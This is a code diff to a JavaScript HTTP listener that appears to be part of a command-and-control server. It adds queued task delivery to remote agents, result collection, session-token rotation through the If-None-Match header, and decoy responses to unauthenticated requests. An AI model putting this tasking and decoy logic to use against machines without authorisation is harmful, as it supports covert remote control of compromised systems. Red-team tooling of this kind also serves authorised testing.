@@ -102,14 +102,28 @@ async function startHttpListener({ id, host = '0.0.0.0', port, name, config = {}
             }
 
             const newToken = randomBytes(32).toString('hex')
-            db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
-            db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ? WHERE id = ?').run(new Date().toISOString(), Date.now(), sess.agent_id)
+            const nowIso = new Date().toISOString()
+            db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, nowIso, sess.id)
+            // Pull next queued task for this agent, if any
+            const nextTask = db.prepare('SELECT * FROM queued_tasks WHERE agent_id = ? ORDER BY enqueued_at ASC LIMIT 1').get(sess.agent_id)
+            let payload = { session_token: newToken, agent_id: sess.agent_id }
+            if (nextTask) {
+              const taskString = String(nextTask.command || '') + (nextTask.args ? (' ' + String(nextTask.args)) : '')
+              payload = { ...payload, Task: taskString }
+              try { db.prepare('DELETE FROM queued_tasks WHERE id = ?').run(nextTask.id) } catch {}
+              try {
+                db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ?, last_queued_task = ?, current_running_task = ? WHERE id = ?')
+                  .run(nowIso, Date.now(), taskString, taskString, sess.agent_id)
+              } catch {}
+            } else {
+              try { db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ? WHERE id = ?').run(nowIso, Date.now(), sess.agent_id) } catch {}
+            }
             broadcast('agents:refresh', { id: sess.agent_id })
 
             updateActivity(id, true)
             res.writeHead(successStatus, { 'Content-Type': 'application/json' })
-            res.end(JSON.stringify({ session_token: newToken, agent_id: sess.agent_id }))
-            console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (session rotated)`)          
+            res.end(JSON.stringify(payload))
+            console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (session rotated${nextTask ? ' + task' : ''})`)
             return
           }
           if (getEndpoints.includes(path)) {
@@ -135,9 +149,59 @@ async function startHttpListener({ id, host = '0.0.0.0', port, name, config = {}
         if (req.method === 'POST') {
           const path = urlObj.pathname || url
           if (path === checkInPath) {
-            // First-time check-in: validate agent key in body and create agent + session
+            // Distinguish results POST (session header + task_result) from first-time registration
             let parsed = {}
             try { parsed = JSON.parse(body || '{}') } catch {}
+            const sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
+            const hasResult = Object.prototype.hasOwnProperty.call(parsed, 'task_result') || Object.prototype.hasOwnProperty.call(parsed, 'result')
+            if (hasResult && sessionToken) {
+              const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
+              if (!sess) {
+                updateActivity(id, false)
+                res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
+                res.end(decoyBody)
+                console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid session for result)`)            
+                return
+              }
+              const agent = db.prepare('SELECT * FROM agents WHERE id = ?').get(sess.agent_id)
+              const fullTask = String(agent?.last_queued_task || '').trim()
+              const parts = fullTask.split(/\s+/)
+              const cmd = parts.shift() || ''
+              const cmdArgs = parts.join(' ')
+              const raw = String(parsed.task_result ?? parsed.result ?? '')
+              const low = raw.trim().toLowerCase()
+              const isBool = low === 'true' || low === 'false'
+              const success = isBool ? low === 'true' : true
+              const command_result = isBool ? '' : raw
+              const error = success ? '' : (command_result || 'Command failed')
+              const cmdId = randomUUID()
+              db.prepare(`INSERT INTO commands (id, agent_id, command, command_args, command_result, success, error, time_tasked, time_completed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`)
+                .run(cmdId, sess.agent_id, cmd, cmdArgs, command_result, success ? 1 : 0, error, new Date().toISOString(), new Date().toISOString())
+              try {
+                db.prepare('UPDATE agents SET terminal_history = COALESCE(terminal_history, "") || ?, current_running_task = "", last_error_task = ?, last_error = ?, last_callback = ?, last_seen_timestamp = ? WHERE id = ?')
+                  .run(`${new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}\nAgent returned ${cmd} results:\n${command_result || (success ? 'OK' : error)}\n\n`, success ? '' : fullTask, success ? '' : error, new Date().toISOString(), Date.now(), sess.agent_id)
+              } catch {}
+              // Broadcast to Next for UI
+              broadcast('command:result', { id: cmdId, agent_id: sess.agent_id, command: cmd, command_args: cmdArgs, command_result, success, error, time_tasked: new Date().toISOString(), time_completed: new Date().toISOString() })
+              // Rotate session and possibly deliver next task
+              const newToken = randomBytes(32).toString('hex')
+              db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
+              const nextTask = db.prepare('SELECT * FROM queued_tasks WHERE agent_id = ? ORDER BY enqueued_at ASC LIMIT 1').get(sess.agent_id)
+              let payload = { session_token: newToken, agent_id: sess.agent_id }
+              if (nextTask) {
+                const taskString = String(nextTask.command || '') + (nextTask.args ? (' ' + String(nextTask.args)) : '')
+                payload = { ...payload, Task: taskString }
+                try { db.prepare('DELETE FROM queued_tasks WHERE id = ?').run(nextTask.id) } catch {}
+                try { db.prepare('UPDATE agents SET last_queued_task = ?, current_running_task = ? WHERE id = ?').run(taskString, taskString, sess.agent_id) } catch {}
+              }
+              updateActivity(id, true)
+              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
+              res.end(JSON.stringify(payload))
+              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (result accepted${nextTask ? ' + task' : ''})`)
+              return
+            }
+
+            // First-time check-in: validate agent key in body and create agent + session
             const incomingKey = String(parsed.agent_key || parsed.key || '')
             if (probeAuthorized || (parsed.probe === true && remoteIsLocal && incomingKey === agentKey)) {
               updateActivity(id, true)
@@ -226,6 +290,58 @@ async function startHttpListener({ id, host = '0.0.0.0', port, name, config = {}
             return
           }
           if (postEndpoints.includes(path)) {
+            // Results post: identify via session header rather than agent key
+            let parsed = {}
+            try { parsed = JSON.parse(body || '{}') } catch {}
+            const sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
+            const hasResult = Object.prototype.hasOwnProperty.call(parsed, 'task_result') || Object.prototype.hasOwnProperty.call(parsed, 'result')
+            if (hasResult && sessionToken) {
+              const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
+              if (!sess) {
+                updateActivity(id, false)
+                res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
+                res.end(decoyBody)
+                console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid session for result)`)            
+                return
+              }
+              const agent = db.prepare('SELECT * FROM agents WHERE id = ?').get(sess.agent_id)
+              const fullTask = String(agent?.last_queued_task || '').trim()
+              const parts = fullTask.split(/\s+/)
+              const cmd = parts.shift() || ''
+              const cmdArgs = parts.join(' ')
+              const raw = String(parsed.task_result ?? parsed.result ?? '')
+              const low = raw.trim().toLowerCase()
+              const isBool = low === 'true' || low === 'false'
+              const success = isBool ? low === 'true' : true
+              const command_result = isBool ? '' : raw
+              const error = success ? '' : (command_result || 'Command failed')
+              const cmdId = randomUUID()
+              db.prepare(`INSERT INTO commands (id, agent_id, command, command_args, command_result, success, error, time_tasked, time_completed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`)
+                .run(cmdId, sess.agent_id, cmd, cmdArgs, command_result, success ? 1 : 0, error, new Date().toISOString(), new Date().toISOString())
+              try {
+                db.prepare('UPDATE agents SET terminal_history = COALESCE(terminal_history, "") || ?, current_running_task = "", last_error_task = ?, last_error = ?, last_callback = ?, last_seen_timestamp = ? WHERE id = ?')
+                  .run(`${new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}\nAgent returned ${cmd} results:\n${command_result || (success ? 'OK' : error)}\n\n`, success ? '' : fullTask, success ? '' : error, new Date().toISOString(), Date.now(), sess.agent_id)
+              } catch {}
+              // Broadcast to Next for UI
+              broadcast('command:result', { id: cmdId, agent_id: sess.agent_id, command: cmd, command_args: cmdArgs, command_result, success, error, time_tasked: new Date().toISOString(), time_completed: new Date().toISOString() })
+              // Rotate session and optionally deliver next task
+              const newToken = randomBytes(32).toString('hex')
+              db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
+              const nextTask = db.prepare('SELECT * FROM queued_tasks WHERE agent_id = ? ORDER BY enqueued_at ASC LIMIT 1').get(sess.agent_id)
+              let payload = { session_token: newToken, agent_id: sess.agent_id }
+              if (nextTask) {
+                const taskString = String(nextTask.command || '') + (nextTask.args ? (' ' + String(nextTask.args)) : '')
+                payload = { ...payload, Task: taskString }
+                try { db.prepare('DELETE FROM queued_tasks WHERE id = ?').run(nextTask.id) } catch {}
+                try { db.prepare('UPDATE agents SET last_queued_task = ?, current_running_task = ? WHERE id = ?').run(taskString, taskString, sess.agent_id) } catch {}
+              }
+              updateActivity(id, true)
+              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
+              res.end(JSON.stringify(payload))
+              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (result accepted${nextTask ? ' + task' : ''})`)
+              return
+            }
+            // Fallback: body-key auth endpoints (legacy)
             if (okAuth) {
               updateActivity(id, true)
               res.writeHead(successStatus)
